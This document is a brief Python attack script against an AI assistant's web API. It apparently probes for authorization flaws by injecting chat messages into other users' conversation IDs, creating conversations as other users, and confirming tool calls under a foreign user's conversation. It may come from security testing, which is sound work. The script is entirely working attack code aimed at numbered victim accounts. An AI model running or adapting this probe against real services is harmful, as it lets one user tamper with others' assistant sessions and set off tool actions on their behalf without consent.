import json,subprocess,os,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def post(path,body,hdr=None):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-H','Accept: text/event-stream']
    if hdr:
        for k,v in hdr.items(): cmd+=['-H',f'{k}: {v}']
    cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== A. chat into ANOTHER user's conversation id ===")
for victim in [230,315,1,235]:
    cid=f"conversation::user:{victim}"
    body={"userMessage":"ZX-INJECT-TEST","conversationId":cid,
          "context":{"module":{"name":"issues","route":"/workspace/5/issues/issues"}}}
    c,b=post('/api/v1/assistant/chat/stream',body,{'X-Conversation-Id':cid})
    print(f"  victim {victim:3} -> {c} {b[:180].replace(chr(10),' ')}")
print()
print("=== B. create conversation AS another user ===")
for victim in [230,1]:
    c,b=post('/api/v1/assistant/conversations',{"conversationId":f"conversation::user:{victim}"})
    print(f"  victim {victim:3} -> {c} {b[:200].replace(chr(10),' ')}")
print()
print("=== C. tools/confirm with foreign conversationId ===")
for victim in [230,1]:
    cid=f"conversation::user:{victim}"
    c,b=post('/api/v1/assistant/tools/confirm',
             {"conversationId":cid,"context":{},"status":"accepted","toolId":"x"},
             {'X-Conversation-Id':cid})
    print(f"  victim {victim:3} -> {c} {b[:180].replace(chr(10),' ')}")
